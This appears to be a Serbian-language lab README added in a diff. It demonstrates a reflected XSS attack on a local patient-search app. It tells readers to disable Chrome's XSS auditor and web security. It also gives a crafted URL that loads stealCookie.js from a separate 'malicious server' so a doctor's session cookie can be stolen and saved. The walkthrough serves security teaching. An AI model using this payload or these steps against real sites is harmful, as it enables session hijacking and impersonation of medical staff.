@@ -1,0 +1,40 @@
+**Cross site scripting - XSS attack **
+
+Pre samog izvrsavanja napada potrebno je podesiti Chrome kako bi dozvolio demonstraciju napda.
+U slucaju da se ne iskljuci odbrana od XSS dobicete poruku upozorenja.
+
+Podesavanje Chrome-a:
+	1. Zatvoriti SVE otvorene prozore Chrome-a.
+	2. Otvoriti cmd.
+	3. Pokrenuti "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --disable-xss-auditor
+	
+**Reflected / Non-persistant XSS
+
+1. Napadač je uočio da na našem sajtu, kada doktor pretražuje sve pacijete, ako nema rezultatata
+pretrage URL izgleda ovako http://localhost:8080/noResult.html?q=Sima i pojavljuje se tekst
+"Nema rezultata pretrage za Sima."
+
+2. Šta će se desiti ako sada pokušate da uneste u polje za pretragu ovako nešto: <script>alert('xss');</script>
+Script tag će se izvršiti!
+
+3. Napadač uočava da može da kreira takav URL da on izvrši skriptu koja radi ono što napadač želi.
+U ovom slučaju napadač želi cookie lekara koji otvori link. Kada preuzme cookie,
+može ga ugraditi u browser i logovati se kao lekar. 
+
+Maliciozni URL koji lekar dobije na email (ili neki drugi način) izgleda ovako:
+ http://localhost:8080/noResult.html?q=Sima<script%20src="http://localhost:8084/stealCookie.js"></script>
+ 
+ 4. Lekar klikne na dobijen URL i skripta stealCookie.js će se izvršiti.
+ *Napomena: Browseri imaju ugradjenu zastitu od XSS-a pa je potrebno iskljuciti.
+ **Napomena: Pokrenuti MaliciousServer
+ 	- Zatvoriti SVE Chrome prozore
+ 	- Otvoriti cmd i pokrenuti "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir
+ 	- Otici na stranicu http://localhost:8080 i ulogovati se.
+ 	- Otvoriti novi tab u istom prozoru i kopirati maliciozni link  http://localhost:8080/noResult.html?q=Sima<script%20src="http://localhost:8084/stealCookie.js"></script>
+ 	
+ 5. Skripta upisuje kolačić lekara u txt dokument koji ce biti sacuvan na Desktopu.
+ 
+ 
+
+
+	
